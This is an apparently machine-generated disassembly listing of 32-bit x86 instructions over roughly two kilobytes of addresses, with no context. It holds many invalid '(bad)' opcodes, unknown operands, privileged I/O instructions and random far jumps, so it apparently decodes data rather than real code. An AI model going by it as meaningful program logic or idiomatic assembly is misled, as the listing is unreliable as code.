  418080:	in     eax,0x9a
  418082:	js     0x4180a6
  418084:	push   ss
  418085:	adc    DWORD PTR [ebx+0x2da26594],0x2916c121
  41808f:	cmp    eax,0x7c439733
  418094:	xor    ah,ch
  418096:	mov    BYTE PTR [edx-0x19ad5b86],0xeb
  41809d:	call   0x18d839d5
  4180a2:	ror    BYTE PTR [ecx-0x275499c8],0xea
  4180a9:	xor    DWORD PTR [eax-0x742e4534],ebp
  4180af:	adc    DWORD PTR [edi-0x2c],ecx
  4180b2:	sub    dh,BYTE PTR [ebx+0x511d3698]
  4180b8:	iret   
  4180b9:	enter  0x570e,0xd7
  4180bd:	outs   dx,BYTE PTR ds:[esi]
  4180be:	addr16 pushf 
  4180c0:	sub    eax,0xda615354
  4180c5:	adc    esp,DWORD PTR [edi+0x3900e41d]
  4180cb:	int    0x35
  4180cd:	neg    BYTE PTR [edi]
  4180cf:	push   esp
  4180d0:	mov    WORD PTR [edx+ebp*8+0x34],ds
  4180d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180d5:	into   
  4180d6:	adc    ebx,DWORD PTR [esp+ecx*8+0x61]
  4180da:	outs   dx,DWORD PTR ds:[esi]
  4180db:	add    ah,BYTE PTR [edx]
  4180dd:	popa   
  4180de:	inc    ebp
  4180df:	daa    
  4180e0:	lock leavew 
  4180e3:	and    ebp,DWORD PTR [edx-0x34]
  4180e6:	stc    
  4180e7:	sub    ebp,DWORD PTR [esi]
  4180e9:	push   esi
  4180ea:	sub    DWORD PTR [edi+edx*4-0x15],edi
  4180ee:	pop    esp
  4180ef:	cmp    BYTE PTR [ecx],ch
  4180f1:	mov    esi,0x1e6f12b8
  4180f6:	hlt    
  4180f7:	mov    ds:0x153837c,eax
  4180fc:	scas   al,BYTE PTR es:[edi]
  4180fd:	ror    ecx,0x5
  418100:	adc    bh,dh
  418102:	jae    0x4180bb
  418104:	stos   DWORD PTR es:[edi],eax
  418105:	shl    DWORD PTR [edi],cl
  418107:	pop    es
  418108:	(bad)  
  41810a:	rol    BYTE PTR [edx+0x75],1
  41810d:	arpl   bx,ax
  41810f:	adc    eax,0x618ab2f0
  418114:	(bad)  
  418116:	xor    eax,0x5757cf56
  41811b:	into   
  41811c:	push   ss
  41811d:	pop    es
  41811e:	psubb  mm1,QWORD PTR [eax]
  418121:	fldcw  WORD PTR [ebx-0x5368d50a]
  418127:	gs xchg edi,eax
  418129:	es push ecx
  41812b:	xor    ecx,DWORD PTR [eax]
  41812d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41812e:	push   0xce02e64d
  418133:	mov    ecx,0xa2a8995d
  418138:	sub    eax,0xf36f7306
  41813d:	jl     0x41814c
  41813f:	jns    0x418154
  418141:	jno    0x418136
  418143:	repz ja 0x4181b4
  418146:	inc    edx
  418147:	xlat   BYTE PTR ds:[ebx]
  418148:	stos   BYTE PTR es:[edi],al
  418149:	pop    esp
  41814a:	scas   eax,DWORD PTR es:[edi]
  41814b:	lea    esp,[edi+0x73382357]
  418151:	sub    ecx,DWORD PTR [ebx+0x772a973]
  418157:	add    ebx,ecx
  418159:	or     bl,bh
  41815b:	mov    al,ds:0x662a022e
  418160:	call   0x4ec1bcd9
  418165:	stc    
  418166:	cmp    BYTE PTR ss:[ecx-0x22],cl
  41816a:	push   ss
  41816b:	xchg   edx,eax
  41816c:	jmp    0x708b:0x24088e43
  418173:	mov    dh,0xf4
  418175:	lods   al,BYTE PTR ds:[esi]
  418176:	jmp    0x418135
  418178:	lods   eax,DWORD PTR ds:[esi]
  418179:	into   
  41817a:	rol    DWORD PTR [ebp-0x49],1
  41817d:	lahf   
  41817e:	lock add BYTE PTR [esi-0x6],0xd9
  418183:	push   ds
  418184:	daa    
  418185:	jmp    0x5381593f
  41818a:	xchg   ebx,eax
  41818b:	ficom  DWORD PTR [eax+0x14]
  41818e:	or     eax,0x9296b006
  418193:	adc    ch,al
  418195:	(bad)  
  418196:	mov    WORD PTR [ecx-0x25],ss
  418199:	add    eax,0x1f999dc5
  41819e:	imul   ebx,DWORD PTR [edi-0x3178a9a9],0x2a
  4181a5:	inc    esp
  4181a6:	daa    
  4181a7:	fist   WORD PTR [eax+edx*1+0x6a8c824e]
  4181ae:	cwde   
  4181af:	or     DWORD PTR [ebx+ebp*4+0x8867a7c],0xffffffbf
  4181b7:	mov    edx,0x299eca7
  4181bc:	xchg   esp,eax
  4181bd:	dec    ecx
  4181be:	loop   0x4181e8
  4181c0:	push   0xf686db5f
  4181c5:	loopne 0x418218
  4181c7:	cwde   
  4181c8:	or     eax,0x35b896cd
  4181cd:	(bad)  
  4181ce:	pop    edx
  4181cf:	fs jmp 0x4181ab
  4181d2:	xor    BYTE PTR [ecx],ch
  4181d4:	in     eax,0x27
  4181d6:	sub    al,0xd4
  4181d8:	sar    esi,0xc
  4181db:	into   
  4181dc:	mov    ds:0x6230c8d1,al
  4181e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181e2:	int3   
  4181e3:	push   ebx
  4181e4:	in     eax,dx
  4181e5:	call   0x7f9f:0x4e7e238d
  4181ec:	xchg   BYTE PTR [esi+ecx*1],bh
  4181ef:	xor    BYTE PTR [esi-0x2b65ae05],dh
  4181f5:	add    al,0x85
  4181f7:	arpl   WORD PTR [ebp+edi*4+0x1439734],di
  4181fe:	add    DWORD PTR [ebx+0x38],esi
  418201:	dec    ebp
  418202:	mov    eax,ds:0xf6f9e5ae
  418207:	fistp  QWORD PTR [edx]
  418209:	sub    ah,BYTE PTR [edx]
  41820b:	lock cwde 
  41820d:	scas   al,BYTE PTR es:[edi]
  41820e:	leave  
  41820f:	pop    ebx
  418210:	into   
  418211:	fld    TBYTE PTR [ecx]
  418213:	cmp    eax,0x15164008
  418218:	lahf   
  418219:	addr16 push cs
  41821b:	mov    esp,0x3337330b
  418220:	fmul   DWORD PTR [esi-0x53b8a40f]
  418226:	mov    bh,0x8e
  418228:	pop    ecx
  418229:	cwde   
  41822a:	pop    ebx
  41822b:	std    
  41822c:	sbb    DWORD PTR [ebx],0xcca12fad
  418232:	add    al,0xe2
  418234:	lock out dx,al
  418236:	jns    0x41828a
  418238:	mov    edi,0x3c566ff2
  41823d:	out    0x97,al
  41823f:	xor    ch,ah
  418241:	nop
  418242:	repnz loopne 0x418278
  418245:	xor    eax,0x949fd08b
  41824a:	push   ecx
  41824b:	cmc    
  41824c:	cmc    
  41824d:	push   ecx
  41824f:	aam    0x2d
  418251:	cs retf 0xfee3
  418255:	sub    DWORD PTR [ecx],ebx
  418257:	xor    ebx,ecx
  418259:	mov    eax,ds:0x21f36656
  41825e:	inc    ebx
  41825f:	sbb    BYTE PTR [ecx-0x125ca374],al
  418265:	adc    DWORD PTR [ecx+edx*2-0x682cab01],ebx
  41826c:	sub    DWORD PTR [ebx+0x25fb986c],edx
  418272:	dec    ecx
  418273:	jnp    0x4182bc
  418275:	aad    0x77
  418277:	pop    DWORD PTR ds:0x8795568b
  41827d:	mov    edi,0xd138bd11
  418282:	(bad)  [edx]
  418284:	inc    edx
  418285:	jp     0x4182bf
  418287:	mov    ds:0xb9ff00d6,eax
  41828c:	lds    eax,FWORD PTR [edx+0x6f8752ae]
  418292:	loop   0x418283
  418294:	and    al,BYTE PTR [ecx]
  418296:	jg     0x4182d5
  418298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418299:	cmp    BYTE PTR [edx*2-0x48a6958e],0x6
  4182a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a2:	(bad)  
  4182a3:	jmp    DWORD PTR [edx+0x29afda23]
  4182a9:	bound  edi,QWORD PTR [edx-0x2d1c8326]
  4182af:	mov    ebx,0x336e0a44
  4182b4:	or     DWORD PTR [eax+0x49],edi
  4182b7:	mov    ebx,0x6f7840db
  4182bc:	scas   eax,DWORD PTR es:[edi]
  4182bd:	loope  0x418256
  4182bf:	arpl   WORD PTR [eax+0x6],dx
  4182c2:	pop    edx
  4182c3:	ret    0xfefd
  4182c6:	daa    
  4182c7:	or     esi,eax
  4182c9:	or     al,0xa8
  4182cb:	jns    0x418332
  4182cd:	and    BYTE PTR [edi+eiz*4-0x4d],dl
  4182d1:	fldenv [ebp-0x39322150]
  4182d7:	test   BYTE PTR [ebx-0x12],0xa2
  4182db:	gs scas eax,DWORD PTR es:[edi]
  4182dd:	mov    esp,0x8d6a2ef9
  4182e2:	mov    ebx,0xbabd5b42
  4182e7:	add    DWORD PTR [esi],edi
  4182e9:	xor    ah,cl
  4182eb:	cmc    
  4182ec:	xchg   esp,eax
  4182ed:	retf   
  4182ee:	mov    al,ds:0x8e09f8c9
  4182f3:	(bad)  
  4182f4:	in     al,dx
  4182f5:	cwde   
  4182f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f7:	add    al,0xef
  4182f9:	mov    ah,0x79
  4182fc:	in     al,0xfd
  4182fe:	(bad)  
  418300:	mov    WORD PTR [ebx-0x402078b7],ss
  418306:	sbb    eax,0x55de83da
  41830b:	and    eax,0x79204892
  418310:	repnz add al,0x4c
  418313:	imul   ecx,DWORD PTR [ecx+0x7f4cc3e6],0x528d8fb8
  41831d:	enter  0xb044,0xcc
  418321:	lea    ebp,[ecx-0x4e]
  418324:	repnz retf 
  418326:	xchg   edx,eax
  418327:	ins    BYTE PTR es:[edi],dx
  418328:	cld    
  418329:	push   edx
  41832a:	jno    0x4182f2
  41832c:	(bad)  
  41832e:	in     al,0xfe
  418330:	loope  0x418390
  418332:	dec    esi
  418333:	in     eax,0x3b
  418335:	scas   al,BYTE PTR es:[edi]
  418336:	push   ebp
  418337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418338:	pushf  
  418339:	dec    eax
  41833a:	xlat   BYTE PTR ds:[ebx]
  41833b:	jge    0x4182f9
  41833d:	es fst st(7)
  418340:	stos   BYTE PTR es:[edi],al
  418341:	push   edx
  418342:	in     al,dx
  418343:	data16 ficom WORD PTR [ecx+0x32]
  418347:	test   DWORD PTR [ebp+0x3464c48],edx
  41834d:	jnp    0x418362
  41834f:	call   0x7097:0xf637f30c
  418356:	xor    al,0x70
  418358:	lahf   
  418359:	jecxz  0x4182e9
  41835b:	cli    
  41835c:	and    dl,ah
  41835e:	jp     0x418363
  418360:	cmp    ah,BYTE PTR [ecx+0x62994d63]
  418366:	mov    ebx,0xad2d18d9
  41836b:	adc    dl,BYTE PTR [edx-0x453ea6cb]
  418371:	dec    edi
  418372:	sbb    DWORD PTR [ebp-0x71ff9a05],eax
  418378:	lahf   
  418379:	cmp    eax,0xda7fca60
  41837e:	jns    0x41839b
  418380:	bnd jbe 0x41837f
  418383:	xor    eax,0x3977b8ca
  418388:	and    ecx,edx
  41838a:	pop    edx
  41838b:	lock bound ebx,QWORD PTR ds:0xbf89c638
  418392:	loope  0x418361
  418394:	mov    ds:0x3f315f58,eax
  418399:	jecxz  0x418321
  41839b:	icebp  
  41839c:	mov    ds:0x71dd1793,al
  4183a1:	push   es
  4183a2:	retf   0x8e08
  4183a5:	out    0x1b,eax
  4183a7:	xor    eax,0x524e3c78
  4183ac:	or     BYTE PTR [ebp+0x66],dh
  4183af:	add    eax,0xa9751e4f
  4183b4:	ins    BYTE PTR es:[edi],dx
  4183b5:	dec    ecx
  4183b6:	xor    ebx,DWORD PTR [edx+0x3d]
  4183b9:	test   BYTE PTR [edi-0x7],dh
  4183bc:	shl    DWORD PTR [edx+0x240d93],1
  4183c2:	push   0xffffffd3
  4183c4:	push   ebp
  4183c5:	in     eax,dx
  4183c6:	add    DWORD PTR [ecx-0x9c40e63],edi
  4183cc:	mov    ch,al
  4183ce:	or     al,0x22
  4183d0:	jmp    0x46549275
  4183d5:	bound  ebp,QWORD PTR gs:[edi+0x2a]
  4183d9:	mov    cl,ch
  4183db:	push   ecx
  4183dc:	outs   dx,DWORD PTR ds:[esi]
  4183dd:	repnz lods eax,DWORD PTR ds:[esi]
  4183df:	or     DWORD PTR [ebx],ebx
  4183e1:	add    ebx,DWORD PTR [edx+ecx*1+0x13]
  4183e5:	int    0xe1
  4183e7:	sti    
  4183e8:	ficomp WORD PTR [edx+0x121ad5f8]
  4183ee:	fcom   DWORD PTR [eax+eax*1-0x471958fc]
  4183f5:	js     0x418380
  4183f7:	imul   edi,ebx,0xffffffe0
  4183fa:	jbe    0x418447
  4183fc:	dec    DWORD PTR [eax]
  4183fe:	push   eax
  4183ff:	fist   DWORD PTR [edx]
  418401:	jb     0x4183c9
  418403:	in     al,dx
  418404:	cli    
  418405:	fs mov bh,0xeb
  418408:	add    eax,0x8d0ffe0f
  41840d:	mov    dl,0x6e
  41840f:	mov    eax,0x48959740
  418414:	iret   
  418415:	inc    ecx
  418416:	ins    BYTE PTR es:[edi],dx
  418417:	pop    esp
  418418:	enter  0x8ac8,0x76
  41841c:	push   esi
  41841d:	xor    ebx,DWORD PTR [eax]
  41841f:	jbe    0x4183f9
  418421:	inc    edx
  418422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418423:	sbb    eax,0x6a377707
  418428:	jnp    0x418451
  41842a:	stos   DWORD PTR es:[edi],eax
  41842b:	sbb    ch,dl
  41842d:	inc    ebp
  41842e:	arpl   bx,si
  418430:	retf   
  418431:	or     ecx,DWORD PTR [esi+0x41f451d5]
  418437:	jp     0x418433
  418439:	shl    BYTE PTR [ebx],1
  41843b:	test   al,0x4
  41843d:	aas    
  41843e:	xor    al,BYTE PTR [ebp+0x9768ab9]
  418444:	fwait
  418445:	rol    DWORD PTR [ebx+eax*4-0x74310963],cl
  41844c:	mov    ?,ebp
  41844e:	lea    esp,[edi+0xc]
  418451:	scas   al,BYTE PTR es:[edi]
  418452:	popf   
  418453:	jne    0x41849c
  418455:	and    dl,BYTE PTR [ebx+0x3f]
  418458:	mov    eax,0xb7cea6af
  41845d:	retf   
  41845e:	rcl    BYTE PTR [ecx-0x7c433ae9],1
  418464:	xor    eax,esp
  418466:	sbb    ebx,DWORD PTR [ebp+0x6e83cd45]
  41846c:	in     eax,dx
  41846d:	sar    BYTE PTR [ecx+0x72983d83],0x27
  418474:	popf   
  418475:	arpl   WORD PTR [eax],cx
  418477:	es push 0xbbc9c1c1
  41847d:	xor    eax,0xfdff38c5
  418482:	jge    0x418444
  418484:	sub    edi,DWORD PTR [ecx+0x19]
  418487:	es ins DWORD PTR es:[edi],dx
  418489:	jle    0x41845c
  41848b:	stc    
  41848c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41848d:	hlt    
  41848e:	popa   
  41848f:	gs or  eax,0x8b1872f
  418495:	cmp    al,0x4c
  418497:	pop    eax
  418498:	ins    DWORD PTR es:[edi],dx
  418499:	mov    dl,0x5c
  41849b:	out    0x9e,al
  41849d:	xor    ecx,ebp
  41849f:	mov    BYTE PTR ds:0xab1a30c3,ah
  4184a5:	mov    cl,0x4d
  4184a7:	fist   DWORD PTR [edx+0x7208d967]
  4184ad:	hlt    
  4184ae:	std    
  4184af:	nop
  4184b0:	jecxz  0x41847f
  4184b2:	cmp    bh,BYTE PTR ss:[eax+0x76808b6]
  4184b9:	pop    ss
  4184ba:	test   ah,ah
  4184bc:	inc    edi
  4184bd:	xchg   esp,eax
  4184be:	pmaxsw mm1,mm1
  4184c1:	and    BYTE PTR [eax+0x37667cb7],dh
  4184c7:	(bad)  
  4184c9:	mov    ch,0xa9
  4184cb:	fistp  DWORD PTR [esi-0x2177ded7]
  4184d1:	hlt    
  4184d2:	pop    eax
  4184d3:	xor    al,cl
  4184d5:	and    BYTE PTR [eax-0xa],0xc7
  4184d9:	ins    BYTE PTR es:[edi],dx
  4184da:	or     al,0x8f
  4184dc:	cmp    BYTE PTR [ebx+0x1f571ee7],ah
  4184e2:	enter  0xd2be,0xcf
  4184e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e7:	push   es
  4184e8:	arpl   WORD PTR [ebp-0x2ba7effb],bp
  4184ee:	outs   dx,BYTE PTR ds:[esi]
  4184ef:	or     BYTE PTR [ebp+0x7e043c2b],bl
  4184f5:	daa    
  4184f6:	xor    edi,DWORD PTR [ebx+edi*2]
  4184f9:	js     0x418567
  4184fb:	add    BYTE PTR [ebx+edi*1],al
  4184fe:	jae    0x4184fa
  418500:	cli    
  418501:	fld    QWORD PTR [ebx+0x38b1655d]
  418507:	fwait
  418508:	loop   0x4184e5
  41850a:	dec    DWORD PTR [edx+ebp*1-0x7ef20707]
  418511:	stos   BYTE PTR es:[edi],al
  418512:	sub    ah,bl
  418514:	sbb    ebx,DWORD PTR [edx+0x64]
  418517:	push   esp
  418518:	(bad)  
  41851a:	je     0x4184f7
  41851c:	push   edi
  41851d:	push   0xdb3274ea
  418522:	js     0x41852a
  418524:	stos   DWORD PTR es:[edi],eax
  418525:	hlt    
  418526:	in     eax,0x2f
  418528:	jmp    0xa9b0:0xc5389ea
  41852f:	xchg   edx,eax
  418530:	inc    esi
  418531:	dec    eax
  418532:	sub    DWORD PTR [edx-0x20],ebp
  418535:	outs   dx,BYTE PTR ds:[esi]
  418536:	daa    
  418537:	outs   dx,BYTE PTR ds:[esi]
  418538:	jne    0x41853f
  41853a:	fdivr  DWORD PTR [edi-0x5994122a]
  418540:	jbe    0x4184c3
  418542:	aam    0x78
  418544:	scas   al,BYTE PTR es:[edi]
  418545:	fs mov ebp,0xdbaedde0
  41854b:	imul   edi,DWORD PTR [esi+0x7b],0x78
  41854f:	jmp    0x41852f
  418551:	xchg   esp,eax
  418552:	jbe    0x41855c
  418554:	jne    0x41857a
  418556:	lock cmp ch,cl
  418559:	sub    DWORD PTR [eax],ebx
  41855b:	mov    dh,0x32
  41855d:	dec    esp
  41855e:	and    al,0xe6
  418560:	(bad)  
  418561:	fmul   DWORD PTR [ebx+eax*4]
  418564:	or     al,0x59
  418566:	push   0x4003da44
  41856b:	cwde   
  41856c:	adc    edi,edi
  41856e:	ss pop ebx
  418570:	xor    BYTE PTR [ebx-0x20],ah
  418573:	sub    BYTE PTR [ebp+0x14],bl
  418576:	sub    al,0xc1
  418578:	fwait
  418579:	dec    ecx
  41857a:	adc    ecx,DWORD PTR [eax+0xd267989]
  418580:	mov    eax,ds:0xd09ca334
  418585:	pop    eax
  418586:	out    dx,eax
  418587:	xchg   edx,eax
  418588:	lea    ebp,[ebx-0x6a]
  41858b:	add    DWORD PTR [edx+0x4e],edi
  41858e:	push   ecx
  418590:	jno    0x4185cf
  418592:	int3   
  418593:	dec    edx
  418594:	adc    eax,ecx
  418596:	add    al,0x56
  418598:	lea    esp,ds:0x6a3c6226
  41859e:	add    ecx,DWORD PTR [ecx+ebp*1+0xb520a57]
  4185a5:	loop   0x41854a
  4185a7:	push   es
  4185a8:	scas   al,BYTE PTR es:[edi]
  4185a9:	sub    al,0xc
  4185ab:	pop    esi
  4185ac:	test   DWORD PTR [esi+0x41812eb9],esp
  4185b2:	ret    
  4185b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185b4:	mov    ebx,0x9d602953
  4185b9:	out    dx,al
  4185ba:	lock retf 
  4185bc:	push   0xffffff80
  4185be:	pusha  
  4185bf:	test   DWORD PTR [ecx-0x21],ecx
  4185c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c4:	cmp    edx,DWORD PTR [ecx+0x69]
  4185c7:	inc    BYTE PTR [edi]
  4185c9:	test   cl,0x60
  4185cc:	aaa    
  4185cd:	jns    0x418627
  4185cf:	pop    es
  4185d0:	popf   
  4185d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d2:	out    dx,eax
  4185d3:	cdq    
  4185d4:	cmp    eax,edx
  4185d6:	cdq    
  4185d7:	call   0x406f:0x90516ddb
  4185de:	sub    al,0xeb
  4185e0:	sub    BYTE PTR [eax-0x6ededf69],ah
  4185e6:	dec    ebp
  4185e7:	jmp    0x9071:0xfb9ce722
  4185ee:	std    
  4185ef:	int    0xd7
  4185f1:	and    edi,ebp
  4185f3:	mov    edi,0x72987b8e
  4185f8:	sbb    DWORD PTR [edi-0x21],ebp
  4185fb:	jle    0x4185d6
  4185fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fe:	lahf   
  4185ff:	rol    eax,1
  418601:	lods   eax,DWORD PTR ds:[esi]
  418602:	push   esi
  418603:	add    DWORD PTR [edi+0x1d],0x329482c5
  41860a:	data16 jae 0x418649
  41860d:	(bad)
  418612:	and    eax,0x262e7966
  418617:	mov    ebp,0x65468779
  41861c:	test   eax,0x74b7f239
  418621:	cs xchg ebp,eax
  418623:	mov    eax,0xd59e65ac
  418628:	push   ebx
  418629:	es ret 
  41862b:	mov    ch,0x60
  41862d:	jb     0x4185fd
  41862f:	jmp    0x418680
  418631:	push   ecx
  418632:	pushf  
  418633:	cwde   
  418634:	mov    ?,WORD PTR [edi+0x17]
  418637:	mov    dh,0x84
  418639:	call   0x33ae:0xfe907476
  418640:	mov    bl,0xef
  418642:	loop   0x41867d
  418644:	(bad)  
  418645:	out    0x99,al
  418647:	and    BYTE PTR [ecx+0x77971501],0x22
  41864e:	retf   
  41864f:	mov    edi,0xa65cc7cb
  418654:	std    
  418655:	arpl   WORD PTR [ebx-0x1b04c286],si
  41865b:	mov    ?,WORD PTR [edx+eax*8]
  41865e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41865f:	int3   
  418660:	or     eax,0xa347df90
  418665:	(bad)  
  418666:	fnstcw WORD PTR [esi+0xb78f46a]
  41866c:	scas   al,BYTE PTR es:[edi]
  41866d:	mov    ds,WORD PTR [edi-0x5d]
  418670:	out    dx,al
  418671:	mov    edx,edx
  418673:	dec    ebp
  418674:	fidiv  WORD PTR [edi]
  418676:	xlat   BYTE PTR ds:[ebx]
  418677:	inc    ebp
  418678:	fdivr  QWORD PTR [eax+esi*1+0x663f604]
  41867f:	add    BYTE PTR [edx+0x1],dh
  418682:	pop    edx
  418683:	inc    esp
  418684:	adc    cl,dh
  418686:	jno    0x418681
  418688:	leave  
  418689:	mov    eax,0xfa8a73c8
  41868e:	mov    bh,0x54
  418690:	jns    0x4186f5
  418692:	pop    ds
  418693:	shl    DWORD PTR [ecx],1
  418695:	push   ebp
  418696:	dec    ebx
  418697:	test   BYTE PTR [edx],bh
  418699:	sub    DWORD PTR [ecx-0x1b5d8519],esp
  41869f:	xor    esp,eax
  4186a1:	pop    esp
  4186a2:	cmp    esi,DWORD PTR [ecx-0x1b]
  4186a5:	dec    esi
  4186a6:	das    
  4186a7:	test   DWORD PTR [eax+0x8],edi
  4186aa:	mov    bh,0x30
  4186ac:	jnp    0x41865f
  4186ae:	pop    eax
  4186af:	int3   
  4186b0:	jmp    0x70c1:0xc9158306
  4186b7:	mov    edi,0x538c158e
  4186bc:	sbb    DWORD PTR [eax],esp
  4186be:	xchg   ecx,eax
  4186bf:	mov    bl,BYTE PTR [ecx+0xa]
  4186c2:	sbb    edx,eax
  4186c4:	aaa    
  4186c5:	pop    ecx
  4186c6:	popf   
  4186c7:	mov    dh,0xf7
  4186c9:	or     cl,ah
  4186cb:	add    ecx,eax
  4186cd:	dec    esi
  4186ce:	mov    ds:0x4e398d4,eax
  4186d3:	and    esp,DWORD PTR [edx-0xe]
  4186d6:	loopne 0x418701
  4186d8:	pop    eax
  4186d9:	push   eax
  4186da:	sub    esi,ecx
  4186dc:	ss loopne 0x4186a4
  4186df:	imul   ebp,eax,0xd3d0b26c
  4186e5:	shr    DWORD PTR [ecx],cl
  4186e7:	cmp    al,0x80
  4186e9:	and    BYTE PTR ds:[edx-0x33c9cd1d],dl
  4186f0:	jge    0x41876a
  4186f2:	ror    bl,0xe8
  4186f5:	xor    esi,eax
  4186f7:	es jne 0x418751
  4186fa:	mov    edi,0x6d6de25b
  4186ff:	aam    0x64
  418701:	adc    eax,0x925db208
  418706:	inc    esp
  418707:	and    DWORD PTR [esp+esi*1+0xf],esp
  41870b:	sub    BYTE PTR [esi],0x79
  41870e:	shl    BYTE PTR [edi-0x10],cl
  418711:	inc    ecx
  418712:	inc    ebx
  418713:	mov    eax,ebp
  418715:	fs fwait
  418717:	enter  0xd979,0x1d
  41871b:	pop    es
  41871c:	call   0x19c2e310
  418721:	xor    bh,BYTE PTR [esp+edx*1-0x42e309e8]
  418728:	(bad)  
  418729:	outs   dx,BYTE PTR ds:[esi]
  41872a:	pop    eax
  41872b:	add    al,bh
  41872d:	int    0xca
  41872f:	dec    edi
  418730:	inc    ah
  418732:	jp     0x418709
  418734:	push   esp
  418735:	mov    dh,0xf6
  418737:	push   0x9d456ae7
  41873c:	xchg   edx,eax
  41873d:	xor    DWORD PTR [edi+0x5642f61],ebp
  418743:	xchg   edx,eax
  418744:	xor    eax,0xa6f354ed
  418749:	cld    
  41874a:	mov    ch,0x26
  41874c:	in     eax,0xb
  41874e:	ds xchg esi,eax
  418750:	cmc    
  418751:	adc    al,0x55
  418753:	mov    al,ds:0x892e6ed9
  418758:	jo     0x4187bb
  41875a:	push   ss
  41875b:	mov    bh,0x9d
  41875d:	push   ds
  41875e:	or     DWORD PTR [eax-0x423c5413],eax
  418764:	aam    0x27
  418766:	shl    dh,cl
  418768:	ja     0x41876f
  41876a:	and    BYTE PTR [edx-0x3ddaf2c6],0xe1
  418771:	(bad)  
  418772:	out    dx,eax
  418773:	xchg   edx,eax
  418774:	lds    edi,FWORD PTR gs:[edi]
  418777:	dec    esi
  418778:	push   ebx
  418779:	repnz xor bl,BYTE PTR [edx+0x73]
  41877d:	loope  0x4187a8
  41877f:	add    eax,0xf95d5e62
  418784:	xchg   ebx,eax
  418785:	sbb    al,0x53
  418787:	test   BYTE PTR [ebp+edi*1+0x7c744775],al
  41878e:	sbb    al,0xf9
  418790:	cmc    
  418791:	pop    ss
  418792:	cdq    
  418793:	xor    al,0x3e
  418795:	inc    eax
  418796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418797:	push   ecx
  418798:	daa    
  418799:	sub    BYTE PTR [eax+eiz*8-0x2c],bl
  41879d:	icebp  
  41879e:	or     BYTE PTR [ebx-0x6c6ba040],0x4a
  4187a5:	sub    DWORD PTR [ecx-0x63],esi
  4187a8:	jmp    0x50fb4a9
  4187ad:	pop    ss
  4187ae:	push   eax
  4187af:	push   esp
  4187b0:	push   esi
  4187b1:	inc    ebx
  4187b2:	and    dh,BYTE PTR [ebp+0x188146e0]
  4187b8:	mov    WORD PTR [ecx-0x2b],gs
  4187bb:	fucomi st,st(6)
  4187bd:	lods   al,BYTE PTR ds:[esi]
  4187be:	cmp    bl,BYTE PTR ds:0x448332bf
  4187c4:	(bad)  
  4187c5:	mov    esp,0x7045f836
  4187ca:	mov    ch,BYTE PTR [ecx]
  4187cc:	add    al,0x76
  4187ce:	dec    eax
  4187cf:	mov    ss,edi
  4187d1:	cli    
  4187d2:	fld    QWORD PTR [edi+0x2b]
  4187d5:	scas   al,BYTE PTR es:[edi]
  4187d6:	cmp    BYTE PTR [esi+0x30],dl
  4187d9:	js     0x41882d
  4187db:	push   esp
  4187dc:	ret    0xbe57
  4187df:	push   edi
  4187e0:	stc    
  4187e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e2:	sub    al,0xf9
  4187e4:	aaa    
  4187e5:	cmp    esi,esp
  4187e7:	pop    edx
  4187e8:	bound  eax,QWORD PTR [esi]
  4187ea:	or     BYTE PTR [ecx],0xb3
  4187ed:	mov    dh,0x59
  4187ef:	pop    edi
  4187f0:	addr16 fwait
  4187f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f3:	mov    bl,0x1b
  4187f5:	(bad)  
  4187f6:	adc    al,BYTE PTR [ebp+0x3a864c82]
  4187fc:	mov    eax,0xf13aad92
  418801:	cli    
  418802:	hlt    
  418803:	sbb    edi,esi
  418805:	stos   BYTE PTR es:[edi],al
  418806:	adc    eax,0xb1cbefc4
  41880b:	xor    BYTE PTR [esi+edx*4],dl
  41880e:	add    esi,DWORD PTR [esp+eiz*8+0x70]
  418812:	scas   al,BYTE PTR es:[edi]
  418813:	inc    edi
  418814:	cmp    ebx,edi
  418816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418817:	mov    bh,0xdf
  418819:	push   cs
  41881a:	cwde   
  41881b:	das    
  41881c:	sbb    ebx,edx
  41881e:	sub    BYTE PTR [ebx-0x31],0x9b
  418822:	push   es
  418823:	test   al,0x71
  418825:	dec    ebx
  418826:	add    eax,0xcda50783
  41882b:	jb     0x4187ff
  41882d:	pusha  
  41882e:	outs   dx,DWORD PTR ds:[esi]
  41882f:	addr16 std 
  418831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418832:	clc    
  418833:	enter  0xed27,0xb
  418837:	dec    esi
  418838:	jmp    DWORD PTR [ebx-0x78743c2b]
  41883e:	retf   
  41883f:	sbb    BYTE PTR [ebp-0x70588b61],dh
  418845:	sbb    ch,bl
  418847:	or     al,0xcc
  418849:	adc    ebp,DWORD PTR [edi]
  41884b:	cmp    eax,0x51f84864
  418850:	test   BYTE PTR [ecx],dl
  418852:	out    dx,eax
  418853:	or     eax,0x4b7bbb54
  418858:	gs mov ds,edi
  41885b:	jne    0x418801
  41885d:	sub    al,0xef
  41885f:	inc    ebp
  418860:	jb     0x4188de
  418862:	mov    ebp,0xfca9610a
  418867:	mov    dh,0x15
  418869:	cwde   
  41886a:	es cmp edx,edi
  41886d:	stos   BYTE PTR es:[edi],al
  41886e:	inc    esi
  41886f:	retf   
  418870:	hlt    
  418871:	pop    ebp
  418872:	mov    ch,0xed
  418874:	mov    ebx,0x27790653
  418879:	outs   dx,DWORD PTR ds:[esi]
  41887a:	pusha  
